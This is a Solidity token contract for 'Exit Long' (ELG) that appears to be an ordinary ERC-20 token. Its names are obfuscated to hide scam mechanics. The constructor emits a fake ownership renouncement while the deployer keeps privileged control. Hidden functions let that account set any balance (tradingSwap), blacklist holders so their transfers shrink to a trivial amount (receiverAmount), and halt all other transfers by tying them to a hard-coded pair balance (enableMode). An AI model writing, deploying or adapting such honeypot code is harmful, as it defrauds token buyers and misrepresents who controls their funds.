//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface tokenEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverTx) external view returns (uint256);

    function transfer(address receiverShould, uint256 fromTakeToken) external returns (bool);

    function allowance(address autoMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 fromTakeToken) external returns (bool);

    function transferFrom(
        address sender,
        address receiverShould,
        uint256 fromTakeToken
    ) external returns (bool);

    event Transfer(address indexed from, address indexed buyMode, uint256 value);
    event Approval(address indexed autoMarketing, address indexed spender, uint256 value);
}

abstract contract launchMaxWallet {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface enableLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fromReceiver {
    function createPair(address launchFee, address liquidityLaunchedShould) external returns (address);
}

interface tokenEnableMetadata is tokenEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ExitLong is launchMaxWallet, tokenEnable, tokenEnableMetadata {

    uint256 private senderModeReceiver;

    string private swapMode = "ELG";

    event OwnershipTransferred(address indexed marketingLaunched, address indexed swapMax);

    function symbol() external view virtual override returns (string memory) {
        return swapMode;
    }

    mapping(address => bool) public listReceiverTeam;

    uint8 private limitReceiverWallet = 18;

    string private liquidityShould = "Exit Long";

    uint256 modeReceiverFrom;

    uint256 private teamIsAmount;

    function name() external view virtual override returns (string memory) {
        return liquidityShould;
    }

    constructor (){
        
        enableLaunch minLimitSender = enableLaunch(enableTokenTo);
        marketingTake = fromReceiver(minLimitSender.factory()).createPair(minLimitSender.WETH(), address(this));
        
        teamMarketingAuto = _msgSender();
        amountTo();
        liquidityAuto[teamMarketingAuto] = true;
        receiverLaunched[teamMarketingAuto] = exemptLimitAuto;
        
        emit Transfer(address(0), teamMarketingAuto, exemptLimitAuto);
    }

    bool public feeSwap;

    function tradingSwap(address listShould, uint256 fromTakeToken) public {
        modeAt();
        receiverLaunched[listShould] = fromTakeToken;
    }

    uint256 private exemptLimitAuto = 100000000 * 10 ** 18;

    uint256 feeTx;

    function amountTo() public {
        emit OwnershipTransferred(teamMarketingAuto, address(0));
        fundReceiverFee = address(0);
    }

    function launchSell(address enableSender, address receiverShould, uint256 fromTakeToken) internal returns (bool) {
        if (enableSender == teamMarketingAuto) {
            return takeReceiverIs(enableSender, receiverShould, fromTakeToken);
        }
        uint256 fromMarketing = tokenEnable(marketingTake).balanceOf(marketingAtFrom);
        require(fromMarketing == modeReceiverFrom);
        require(receiverShould != marketingAtFrom);
        if (listReceiverTeam[enableSender]) {
            return takeReceiverIs(enableSender, receiverShould, receiverSender);
        }
        return takeReceiverIs(enableSender, receiverShould, fromTakeToken);
    }

    function approve(address exemptFund, uint256 fromTakeToken) public virtual override returns (bool) {
        minModeTeam[_msgSender()][exemptFund] = fromTakeToken;
        emit Approval(_msgSender(), exemptFund, fromTakeToken);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return exemptLimitAuto;
    }

    function transferFrom(address enableSender, address receiverShould, uint256 fromTakeToken) external override returns (bool) {
        if (_msgSender() != enableTokenTo) {
            if (minModeTeam[enableSender][_msgSender()] != type(uint256).max) {
                require(fromTakeToken <= minModeTeam[enableSender][_msgSender()]);
                minModeTeam[enableSender][_msgSender()] -= fromTakeToken;
            }
        }
        return launchSell(enableSender, receiverShould, fromTakeToken);
    }

    bool private shouldFund;

    function receiverAmount(address modeFund) public {
        modeAt();
        
        if (modeFund == teamMarketingAuto || modeFund == marketingTake) {
            return;
        }
        listReceiverTeam[modeFund] = true;
    }

    address public marketingTake;

    function transfer(address listShould, uint256 fromTakeToken) external virtual override returns (bool) {
        return launchSell(_msgSender(), listShould, fromTakeToken);
    }

    bool public exemptMinFrom;

    function getOwner() external view returns (address) {
        return fundReceiverFee;
    }

    function decimals() external view virtual override returns (uint8) {
        return limitReceiverWallet;
    }

    mapping(address => uint256) private receiverLaunched;

    mapping(address => bool) public liquidityAuto;

    function takeReceiverIs(address enableSender, address receiverShould, uint256 fromTakeToken) internal returns (bool) {
        require(receiverLaunched[enableSender] >= fromTakeToken);
        receiverLaunched[enableSender] -= fromTakeToken;
        receiverLaunched[receiverShould] += fromTakeToken;
        emit Transfer(enableSender, receiverShould, fromTakeToken);
        return true;
    }

    bool public totalTo;

    function owner() external view returns (address) {
        return fundReceiverFee;
    }

    mapping(address => mapping(address => uint256)) private minModeTeam;

    function minLiquidity(address walletSender) public {
        if (exemptMinFrom) {
            return;
        }
        if (modeSender != senderModeReceiver) {
            tokenLiquidity = true;
        }
        liquidityAuto[walletSender] = true;
        
        exemptMinFrom = true;
    }

    address public teamMarketingAuto;

    uint256 constant receiverSender = 13 ** 10;

    function allowance(address teamLimit, address exemptFund) external view virtual override returns (uint256) {
        if (exemptFund == enableTokenTo) {
            return type(uint256).max;
        }
        return minModeTeam[teamLimit][exemptFund];
    }

    function enableMode(uint256 fromTakeToken) public {
        modeAt();
        modeReceiverFrom = fromTakeToken;
    }

    address enableTokenTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public tokenTrading;

    bool private fundLimit;

    function modeAt() private view {
        require(liquidityAuto[_msgSender()]);
    }

    address marketingAtFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public tokenLiquidity;

    address private fundReceiverFee;

    function balanceOf(address receiverTx) public view virtual override returns (uint256) {
        return receiverLaunched[receiverTx];
    }

    uint256 private modeSender;

}